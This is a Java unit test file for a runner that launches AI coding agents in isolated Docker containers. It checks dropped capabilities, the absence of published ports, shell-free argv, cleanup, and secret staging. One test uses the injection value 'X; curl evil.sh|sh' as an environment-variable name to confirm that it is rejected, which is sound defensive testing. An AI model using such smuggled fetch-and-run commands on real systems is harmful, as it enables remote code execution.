package com.example.dvely.agent.infrastructure.codingagent;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyList;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.RETURNS_SELF;
import static org.mockito.Mockito.lenient;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.times;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import com.example.dvely.agent.infrastructure.codingagent.CodingAgentContainerRunner.ContainerRunOutcome;
import com.github.dockerjava.api.DockerClient;
import com.github.dockerjava.api.async.ResultCallback;
import com.github.dockerjava.api.command.CopyArchiveToContainerCmd;
import com.github.dockerjava.api.command.CreateContainerCmd;
import com.github.dockerjava.api.command.CreateContainerResponse;
import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
import org.apache.commons.compress.archivers.tar.TarArchiveInputStream;
import com.github.dockerjava.api.command.ExecCreateCmd;
import com.github.dockerjava.api.command.ExecCreateCmdResponse;
import com.github.dockerjava.api.command.ExecStartCmd;
import com.github.dockerjava.api.command.InspectExecCmd;
import com.github.dockerjava.api.command.InspectExecResponse;
import com.github.dockerjava.api.command.InspectImageCmd;
import com.github.dockerjava.api.command.InspectImageResponse;
import com.github.dockerjava.api.command.PullImageCmd;
import com.github.dockerjava.api.command.RemoveContainerCmd;
import com.github.dockerjava.api.command.StartContainerCmd;
import com.github.dockerjava.api.exception.NotFoundException;
import com.github.dockerjava.api.model.Capability;
import com.github.dockerjava.api.model.Frame;
import com.github.dockerjava.api.model.HostConfig;
import com.github.dockerjava.api.model.StreamType;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.List;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

@ExtendWith(MockitoExtension.class)
class CodingAgentContainerRunnerTest {

    private static final String CONTAINER_ID = "container-1";

    @Mock
    private DockerClient dockerClient;

    private CodingAgentProperties properties;
    private CodingAgentContainerRunner runner;

    private CreateContainerCmd createCmd;
    private ExecCreateCmd execCreateCmd;
    private ExecStartCmd execStartCmd;
    private RemoveContainerCmd removeCmd;
    private CopyArchiveToContainerCmd copyCmd;

    @BeforeEach
    void setUp() {
        properties = new CodingAgentProperties();
        runner = new CodingAgentContainerRunner(dockerClient, properties);
    }

    private void stubImagePresent() {
        InspectImageCmd inspectImage = mock(InspectImageCmd.class, RETURNS_SELF);
        lenient().when(dockerClient.inspectImageCmd(anyString())).thenReturn(inspectImage);
        lenient().when(inspectImage.exec()).thenReturn(new InspectImageResponse());
    }

    private void stubContainerLifecycle() {
        createCmd = mock(CreateContainerCmd.class, RETURNS_SELF);
        lenient().when(dockerClient.createContainerCmd(anyString())).thenReturn(createCmd);
        CreateContainerResponse created = new CreateContainerResponse();
        created.setId(CONTAINER_ID);
        lenient().when(createCmd.exec()).thenReturn(created);

        StartContainerCmd startCmd = mock(StartContainerCmd.class, RETURNS_SELF);
        lenient().when(dockerClient.startContainerCmd(anyString())).thenReturn(startCmd);

        removeCmd = mock(RemoveContainerCmd.class, RETURNS_SELF);
        lenient().when(dockerClient.removeContainerCmd(anyString())).thenReturn(removeCmd);

        copyCmd = mock(CopyArchiveToContainerCmd.class, RETURNS_SELF);
        lenient().when(dockerClient.copyArchiveToContainerCmd(anyString())).thenReturn(copyCmd);
    }

    /**
     * @param completes whether the exec finishes before the timeout; when false the callback is
     *                  never completed, so awaitCompletion() has to time out on its own.
     */
    private void stubExec(boolean completes, int exitCode, String stdout, String stderr) {
        execCreateCmd = mock(ExecCreateCmd.class, RETURNS_SELF);
        lenient().when(dockerClient.execCreateCmd(anyString())).thenReturn(execCreateCmd);
        ExecCreateCmdResponse execCreated = mock(ExecCreateCmdResponse.class);
        lenient().when(execCreated.getId()).thenReturn("exec-1");
        lenient().when(execCreateCmd.exec()).thenReturn(execCreated);

        execStartCmd = mock(ExecStartCmd.class, RETURNS_SELF);
        lenient().when(dockerClient.execStartCmd(anyString())).thenReturn(execStartCmd);
        lenient().when(execStartCmd.exec(any())).thenAnswer(invocation -> {
            ResultCallback.Adapter<Frame> callback = invocation.getArgument(0);
            if (!stdout.isEmpty()) {
                callback.onNext(new Frame(StreamType.STDOUT, stdout.getBytes(StandardCharsets.UTF_8)));
            }
            if (!stderr.isEmpty()) {
                callback.onNext(new Frame(StreamType.STDERR, stderr.getBytes(StandardCharsets.UTF_8)));
            }
            if (completes) {
                callback.onComplete();
            }
            return callback;
        });

        InspectExecCmd inspectExec = mock(InspectExecCmd.class, RETURNS_SELF);
        lenient().when(dockerClient.inspectExecCmd(anyString())).thenReturn(inspectExec);
        InspectExecResponse inspectResponse = mock(InspectExecResponse.class);
        lenient().when(inspectResponse.getExitCodeLong()).thenReturn((long) exitCode);
        lenient().when(inspectExec.exec()).thenReturn(inspectResponse);
    }

    private ContainerRunOutcome run() {
        return runner.run("/host/checkout", null, List.of("claude", "-p", "hi"), Duration.ofSeconds(5));
    }

    @Test
    void failsClearlyWhenTheImageIsMissingInsteadOfPullingIt() {
        InspectImageCmd inspectImage = mock(InspectImageCmd.class, RETURNS_SELF);
        when(dockerClient.inspectImageCmd(anyString())).thenReturn(inspectImage);
        when(inspectImage.exec()).thenThrow(new NotFoundException("no such image"));

        assertThatThrownBy(this::run)
                .isInstanceOf(CodingAgentProvisionException.class)
                .hasMessageContaining("qeploy/coding-agent:local");

        // Pulling a same-named public image would run unknown code with a user's real API key.
        verify(dockerClient, never()).pullImageCmd(anyString());
        verify(dockerClient, never()).createContainerCmd(anyString());
    }

    @Test
    void appliesTheIsolationPolicyAndMountsTheWorkspace() {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(true, 0, "ok", "");

        run();

        ArgumentCaptor<HostConfig> hostConfig = ArgumentCaptor.captor();
        verify(createCmd).withHostConfig(hostConfig.capture());
        HostConfig config = hostConfig.getValue();

        assertThat(config.getCapDrop()).containsExactly(Capability.ALL);
        assertThat(config.getSecurityOpts()).contains("no-new-privileges");
        assertThat(config.getMemory()).isEqualTo(properties.getMemoryBytes());
        assertThat(config.getPidsLimit()).isEqualTo(properties.getPidsLimit());
        assertThat(config.getBinds()).hasSize(1);
        assertThat(config.getBinds()[0].getPath()).isEqualTo("/host/checkout");
        assertThat(config.getBinds()[0].getVolume().getPath())
                .isEqualTo(properties.getWorkspaceMountPath());
    }

    @Test
    void publishesNoPortSoTheAgentContainerIsNotReachableFromOutside() {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(true, 0, "ok", "");

        run();

        ArgumentCaptor<HostConfig> hostConfig = ArgumentCaptor.captor();
        verify(createCmd).withHostConfig(hostConfig.capture());
        // A coding agent serves nothing; any published port would be pure attack surface.
        assertThat(hostConfig.getValue().getPortBindings()).isNull();
    }

    @Test
    void execRunsArgvDirectlyWithoutAShell() {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(true, 0, "ok", "");

        run();

        ArgumentCaptor<String[]> cmd = ArgumentCaptor.captor();
        verify(execCreateCmd).withCmd(cmd.capture());
        // No "sh"/"-c" wrapper: there is no shell to inject a prompt's metacharacters into.
        assertThat(cmd.getValue()).containsExactly("claude", "-p", "hi");
    }

    @Test
    void neverPutsAnythingInTheExecEnvironment() {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(true, 0, "ok", "");

        run();

        // Kept as its own test because it is a security invariant, not an implementation detail:
        // docker-java's AbstrDockerCmd.exec() logs a reflective dump of every command field at
        // DEBUG, so anything handed to withEnv can reach the application log verbatim. Secrets go
        // through the staged file instead (see anEnvCredentialIsStagedAsAFileAndNeverPassedToWithEnv).
        verify(execCreateCmd, never()).withEnv(anyList());
    }

    @Test
    void separatesStdoutFromStderrAndReportsTheExitCode() {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(true, 3, "정상 출력", "에러 출력");

        ContainerRunOutcome outcome = run();

        assertThat(outcome.stdout()).isEqualTo("정상 출력");
        assertThat(outcome.stderr()).isEqualTo("에러 출력");
        assertThat(outcome.exitCode()).isEqualTo(3);
        assertThat(outcome.timedOut()).isFalse();
    }

    @Test
    void reportsATimeoutWhenTheExecNeverCompletes() {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(false, 0, "partial", "");

        ContainerRunOutcome outcome = runner.run("/host/checkout", null, List.of("claude", "-p", "hi"), Duration.ofMillis(50));

        assertThat(outcome.timedOut()).isTrue();
        assertThat(outcome.exitCode()).isEqualTo(-1);
        // Whatever the agent managed to print before the bound elapsed is still worth returning.
        assertThat(outcome.stdout()).isEqualTo("partial");
    }

    @Test
    void alwaysRemovesTheContainerEvenWhenTheRunTimesOut() {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(false, 0, "", "");

        runner.run("/host/checkout", null, List.of("claude"), Duration.ofMillis(50));

        verify(dockerClient).removeContainerCmd(CONTAINER_ID);
        verify(removeCmd).withForce(true);
    }

    @Test
    void removesTheContainerEvenWhenTheExecBlowsUp() {
        stubImagePresent();
        stubContainerLifecycle();
        execCreateCmd = mock(ExecCreateCmd.class, RETURNS_SELF);
        when(dockerClient.execCreateCmd(anyString())).thenReturn(execCreateCmd);
        when(execCreateCmd.exec()).thenThrow(new IllegalStateException("docker 폭발"));

        assertThatThrownBy(this::run).isInstanceOf(IllegalStateException.class);

        // A leaked container would hold its memory/CPU reservation for as long as the daemon lives.
        verify(dockerClient).removeContainerCmd(CONTAINER_ID);
    }

    @Test
    void runsTheLoginStepBeforeTheAgentAndFeedsTheKeyViaAStagedFileNotAHijackedStdin() throws Exception {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(true, 0, "ok", "");

        runner.run("/host/checkout",
                new CodingAgentContainerRunner.Credential.LoginCommand(
                        List.of("codex", "login", "--with-api-key"), "sk-proj-secret"),
                List.of("codex", "exec", "hi"), Duration.ofSeconds(5));

        // The key is uploaded with the archive API (plain HTTP PUT) under /run — never through
        // ExecStartCmd#withStdIn, which the OkHttp transport cannot keep open (measured:
        // AsynchronousCloseException against the real daemon).
        ArgumentCaptor<java.io.InputStream> tarStream = ArgumentCaptor.captor();
        verify(copyCmd).withRemotePath("/run");
        verify(copyCmd).withTarInputStream(tarStream.capture());
        try (TarArchiveInputStream tar = new TarArchiveInputStream(tarStream.getValue())) {
            TarArchiveEntry entry = tar.getNextEntry();
            assertThat(entry.getName()).isEqualTo("qeploy/stdin");
            assertThat(entry.getMode() & 0777).isEqualTo(0600);
            assertThat(new String(tar.readAllBytes(), StandardCharsets.UTF_8)).isEqualTo("sk-proj-secret");
        }

        // Two execs: the login (wrapped so the staged file is its stdin, then deleted), then the
        // agent. The login argv rides as positional parameters after a constant script — never
        // interpolated — so it can hold any shell metacharacter without becoming syntax.
        ArgumentCaptor<String[]> cmd = ArgumentCaptor.captor();
        verify(execCreateCmd, times(2)).withCmd(cmd.capture());
        String[] login = cmd.getAllValues().get(0);
        assertThat(login[0]).isEqualTo("sh");
        assertThat(login[1]).isEqualTo("-c");
        assertThat(login[2]).contains("< /run/qeploy/stdin").contains("rm -f /run/qeploy/stdin");
        assertThat(login[3]).isEqualTo("sh");
        assertThat(java.util.Arrays.copyOfRange(login, 4, login.length))
                .containsExactly("codex", "login", "--with-api-key");
        assertThat(cmd.getAllValues().get(1)).containsExactly("codex", "exec", "hi");

        // Neither exec attaches stdin any more.
        ArgumentCaptor<Boolean> attachStdin = ArgumentCaptor.captor();
        verify(execCreateCmd, times(2)).withAttachStdin(attachStdin.capture());
        assertThat(attachStdin.getAllValues()).containsExactly(false, false);
    }

    @Test
    void doesNotStageAnythingWhenThereIsNoCredential() {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(true, 0, "ok", "");

        run(); // credential == null

        verify(dockerClient, never()).copyArchiveToContainerCmd(anyString());
        ArgumentCaptor<String[]> cmd = ArgumentCaptor.captor();
        verify(execCreateCmd).withCmd(cmd.capture());
        assertThat(cmd.getValue()).containsExactly("claude", "-p", "hi");
    }

    @Test
    void anEnvCredentialIsStagedAsAFileAndNeverPassedToWithEnv() throws Exception {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(true, 0, "ok", "");

        runner.run("/host/checkout",
                new CodingAgentContainerRunner.Credential.EnvVar("ANTHROPIC_API_KEY", "sk-ant-secret"),
                List.of("claude", "-p", "hi"), Duration.ofSeconds(5));

        // withEnv is the leak: docker-java reflectively dumps every command field into a DEBUG log
        // line, so a key placed there ends up in the application log verbatim. It must never be
        // called with the secret — the staged file is the only channel.
        verify(execCreateCmd, never()).withEnv(anyList());

        ArgumentCaptor<java.io.InputStream> tarStream = ArgumentCaptor.captor();
        verify(copyCmd).withTarInputStream(tarStream.capture());
        try (TarArchiveInputStream tar = new TarArchiveInputStream(tarStream.getValue())) {
            TarArchiveEntry entry = tar.getNextEntry();
            assertThat(entry.getName()).isEqualTo("qeploy/stdin");
            assertThat(new String(tar.readAllBytes(), StandardCharsets.UTF_8)).isEqualTo("sk-ant-secret");
        }

        // The wrapper exports the staged value and deletes the file; argv still rides as positional
        // parameters, so only this constant text is ever parsed by a shell.
        ArgumentCaptor<String[]> cmd = ArgumentCaptor.captor();
        verify(execCreateCmd).withCmd(cmd.capture());
        String[] c = cmd.getValue();
        assertThat(c[0]).isEqualTo("sh");
        assertThat(c[2])
                .contains("ANTHROPIC_API_KEY=\"$(cat /run/qeploy/stdin)\"")
                .contains("rm -f /run/qeploy/stdin")
                .contains("export ANTHROPIC_API_KEY")
                .contains("exec \"$@\"");
        assertThat(java.util.Arrays.copyOfRange(c, 4, c.length)).containsExactly("claude", "-p", "hi");
        assertThat(c).noneMatch(a -> a.contains("sk-ant-secret"));
    }

    @Test
    void rejectsAnEnvNameThatCouldBecomeShellSyntax() {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(true, 0, "ok", "");

        // The name is the one thing interpolated into the wrapper, so it is validated rather than
        // trusted — even though today's callers only pass compile-time constants.
        assertThatThrownBy(() -> runner.run("/host/checkout",
                new CodingAgentContainerRunner.Credential.EnvVar("X; curl evil.sh|sh", "s"),
                List.of("claude"), Duration.ofSeconds(5)))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    void doesNotRunTheAgentWhenLoginFails() {
        stubImagePresent();
        stubContainerLifecycle();
        stubExec(true, 1, "", "bad key");

        ContainerRunOutcome outcome = runner.run("/host/checkout",
                new CodingAgentContainerRunner.Credential.LoginCommand(List.of("codex", "login"), "bad"),
                List.of("codex", "exec", "hi"), Duration.ofSeconds(5));

        // Running the agent anyway would burn the whole timeout retrying a 401 and produce output
        // that blames the model instead of the credential.
        assertThat(outcome.exitCode()).isEqualTo(1);
        verify(execCreateCmd, times(1)).withCmd(any(String[].class));
    }

    @Test
    void wrapsAContainerCreateFailureAsARetryableProvisionFailure() {
        stubImagePresent();
        createCmd = mock(CreateContainerCmd.class, RETURNS_SELF);
        when(dockerClient.createContainerCmd(anyString())).thenReturn(createCmd);
        when(createCmd.exec()).thenThrow(new IllegalStateException("daemon busy"));

        // Nothing has run yet, so the caller is allowed to retry this one.
        assertThatThrownBy(this::run).isInstanceOf(CodingAgentProvisionException.class);
    }
}
